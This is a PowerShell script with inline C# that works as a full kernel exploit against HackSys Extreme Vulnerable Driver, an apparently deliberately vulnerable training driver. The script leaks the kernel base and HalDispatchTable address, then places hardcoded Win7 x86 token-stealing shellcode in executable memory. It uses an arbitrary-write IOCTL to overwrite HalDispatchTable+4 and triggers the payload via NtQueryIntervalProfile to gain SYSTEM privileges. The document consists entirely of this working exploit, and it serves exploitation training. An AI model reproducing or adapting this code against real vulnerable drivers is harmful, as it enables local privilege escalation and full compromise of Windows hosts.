Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

[StructLayout(LayoutKind.Sequential, Pack = 1)]
public struct SYSTEM_MODULE_INFORMATION
{
	[MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
	public UIntPtr[] Reserved;
	public IntPtr ImageBase;
	public UInt32 ImageSize;
	public UInt32 Flags;
	public UInt16 LoadOrderIndex;
	public UInt16 InitOrderIndex;
	public UInt16 LoadCount;
	public UInt16 ModuleNameOffset;
	[MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
	internal Char[] _ImageName;
	public String ImageName {
		get {
			return new String(_ImageName).Split(new Char[] {'\0'}, 2)[0];
		}
	}
}

public static class EVD
{
    [DllImport("kernel32", SetLastError=true, CharSet = CharSet.Ansi)]
        public static extern IntPtr LoadLibrary(
			string lpFileName);
         
    [DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
        public static extern IntPtr GetProcAddress(
            IntPtr hModule,
            string procName);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern IntPtr VirtualAlloc(
		IntPtr lpAddress,
		uint dwSize,
		UInt32 flAllocationType,
		UInt32 flProtect);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern IntPtr CreateFile(
		String lpFileName,
		UInt32 dwDesiredAccess,
		UInt32 dwShareMode,
		IntPtr lpSecurityAttributes,
		UInt32 dwCreationDisposition,
		UInt32 dwFlagsAndAttributes,
		IntPtr hTemplateFile);

	[DllImport("Kernel32.dll", SetLastError = true)]
	public static extern bool DeviceIoControl(
		IntPtr hDevice,
		int IoControlCode,
		byte[] InBuffer,
		int nInBufferSize,
		byte[] OutBuffer,
		int nOutBufferSize,
		ref int pBytesReturned,
		IntPtr Overlapped);

	[DllImport("ntdll.dll")]
	public static extern int NtQuerySystemInformation(
		int SystemInformationClass,
		IntPtr SystemInformation,
		int SystemInformationLength,
		ref int ReturnLength);

	[DllImport("ntdll.dll")]
	public static extern uint NtQueryIntervalProfile(
		UInt32 ProfileSource,
		ref UInt32 Interval);

	[DllImport("kernel32.dll")]
	public static extern uint GetLastError();
}
"@

# Call NtQuerySystemInformation->SystemModuleInformation
# & Alloc buffer for the result
[int]$BuffPtr_Size = 0
while ($true) {
	[IntPtr]$BuffPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($BuffPtr_Size)
	$SystemInformationLength = New-Object Int
	# SystemModuleInformation Class = 11
	$CallResult = [EVD]::NtQuerySystemInformation(11, $BuffPtr, $BuffPtr_Size, [ref]$SystemInformationLength)

	# STATUS_INFO_LENGTH_MISMATCH
	if ($CallResult -eq 0xC0000004) {
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
		[int]$BuffPtr_Size = [System.Math]::Max($BuffPtr_Size,$SystemInformationLength)
	}
	# STATUS_SUCCESS
	elseif ($CallResult -eq 0x00000000) {
		break
	}
	# Probably: 0xC0000005 -> STATUS_ACCESS_VIOLATION
	else {
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)
		echo "[!] Error, NTSTATUS Value: $('{0:X}' -f ($CallResult))`n"
		return
	}
}

# Create SystemModuleInformation struct
$SYSTEM_MODULE_INFORMATION = New-Object SYSTEM_MODULE_INFORMATION
$SYSTEM_MODULE_INFORMATION = $SYSTEM_MODULE_INFORMATION.GetType()
if ([System.IntPtr]::Size -eq 4) {
	$SYSTEM_MODULE_INFORMATION_Size = 284
} else {
	$SYSTEM_MODULE_INFORMATION_Size = 296
}

# Read SystemModuleInformation array count
# & increment offset IntPtr size
$BuffOffset = $BuffPtr.ToInt64()
$HandleCount = [System.Runtime.InteropServices.Marshal]::ReadInt32($BuffOffset)
$BuffOffset = $BuffOffset + [System.IntPtr]::Size

# Loop SystemModuleInformation array
# & store output in $SystemModuleArray
$SystemModuleArray = @()
for ($i=0; $i -lt $HandleCount; $i++){
	$SystemPointer = New-Object System.Intptr -ArgumentList $BuffOffset
	$Cast = [system.runtime.interopservices.marshal]::PtrToStructure($SystemPointer,[type]$SYSTEM_MODULE_INFORMATION)
	
	$HashTable = @{
		ImageName = $Cast.ImageName
		ImageBase = if ([System.IntPtr]::Size -eq 4) {$($Cast.ImageBase).ToInt32()} else {$($Cast.ImageBase).ToInt64()}
		ImageSize = "0x$('{0:X}' -f $Cast.ImageSize)"
	}
	
	$Object = New-Object PSObject -Property $HashTable
	$SystemModuleArray += $Object

	$BuffOffset = $BuffOffset + $SYSTEM_MODULE_INFORMATION_Size
}

# Free SystemModuleInformation array
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($BuffPtr)

# Get pointer to nt!HalDispatchTable
echo "`n[>] Leaking HalDispatchTable pointer.."
$KernelBase = $SystemModuleArray[0].ImageBase
$KernelType = ($SystemModuleArray[0].ImageName -split "\\")[-1]
$KernelHanle = [EVD]::LoadLibrary("$KernelType")
$HALUserLand = [EVD]::GetProcAddress($KernelHanle, "HalDispatchTable")
$HalDispatchTable = $HALUserLand.ToInt32() - $KernelHanle + $KernelBase
$WriteWhere = [System.BitConverter]::GetBytes($HalDispatchTable+4)
echo "[+] Kernel Base: 0x$('{0:X}' -f $KernelBase)"
echo "[+] HalDispatchTable: 0x$('{0:X}' -f $HalDispatchTable)"

# Compiled with Keystone-Engine
# Hardcoded offsets for Win7 x86 SP1
$Shellcode = [Byte[]] @(
	#---[Setup]
	0x60,                               # pushad
	0x64, 0xA1, 0x24, 0x01, 0x00, 0x00, # mov eax, fs:[KTHREAD_OFFSET]
	0x8B, 0x40, 0x50,                   # mov eax, [eax + EPROCESS_OFFSET]
	0x89, 0xC1,                         # mov ecx, eax (Current _EPROCESS structure)
	0x8B, 0x98, 0xF8, 0x00, 0x00, 0x00, # mov ebx, [eax + TOKEN_OFFSET]
	#---[Copy System PID token]
	0xBA, 0x04, 0x00, 0x00, 0x00,       # mov edx, 4 (SYSTEM PID)
	0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, # mov eax, [eax + FLINK_OFFSET] <-|
	0x2D, 0xB8, 0x00, 0x00, 0x00,       # sub eax, FLINK_OFFSET           |
	0x39, 0x90, 0xB4, 0x00, 0x00, 0x00, # cmp [eax + PID_OFFSET], edx     |
	0x75, 0xED,                         # jnz                           ->|
	0x8B, 0x90, 0xF8, 0x00, 0x00, 0x00, # mov edx, [eax + TOKEN_OFFSET]
	0x89, 0x91, 0xF8, 0x00, 0x00, 0x00, # mov [ecx + TOKEN_OFFSET], edx
	#---[Recover]
	0x61,                               # popad
	0xC3                                # ret
)

# Write shellcode to memory
echo "`n[>] Allocating ring0 payload.."
[IntPtr]$Pointer = [EVD]::VirtualAlloc([System.IntPtr]::Zero, $Shellcode.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($Shellcode, 0, $Pointer, $Shellcode.Length)
$WriteWhat = [System.BitConverter]::GetBytes($Pointer.ToInt32())
echo "[+] Payload size: $($Shellcode.Length)"
echo "[+] Payload address: 0x$("{0:X8}" -f $Pointer.ToInt32())"

# Get handle to driver
$hDevice = [EVD]::CreateFile("\\.\HacksysExtremeVulnerableDriver", [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)

if ($hDevice -eq -1) {
	echo "`n[!] Unable to get driver handle..`n"
	Return
} else {
	echo "`n[>] Driver information.."
	echo "[+] lpFileName: \\.\HacksysExtremeVulnerableDriver"
	echo "[+] Handle: $hDevice"
}

# TriggerArbitraryOverwrite() IOCTL = 0x22200B
# => [IntPtr]$WriteWhatPtr->$WriteWhat + $WriteWhere
#---
[IntPtr]$WriteWhatPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($WriteWhat.Length)
[System.Runtime.InteropServices.Marshal]::Copy($WriteWhat, 0, $WriteWhatPtr, $WriteWhat.Length)
$Buffer = [System.BitConverter]::GetBytes($WriteWhatPtr.ToInt32()) + $WriteWhere

echo "`n[>] Sending WriteWhatWhere buffer.."
echo "[+] IOCTL: 0x22200B"
echo "[+] Buffer length: $($Buffer.Length)"
echo "[+] WriteWhere: 0x$('{0:X}' -f $($HalDispatchTable+4)) => nt!HalDispatchTable+4`n"
[EVD]::DeviceIoControl($hDevice, 0x22200B, $Buffer, $Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null

# NtQueryIntervalProfile()->KeQueryIntervalProfile()
# => KeQueryIntervalProfile+0x23-> call dword HalDispatchTable+0x4
#---
# kd> 
# nt!KeQueryIntervalProfile+0x23:
# 82cd0836 ff150404b382    call    dword ptr [nt!HalDispatchTable+0x4 (82b30404)]
# 82cd083c 85c0            test    eax,eax
# 82cd083e 7c0b            jl      nt!KeQueryIntervalProfile+0x38 (82cd084b)
#---
echo "[>] Calling NtQueryIntervalProfile trigger..`n"
[UInt32]$Dummy = 0
[EVD]::NtQueryIntervalProfile(2,[ref]$Dummy) |Out-Null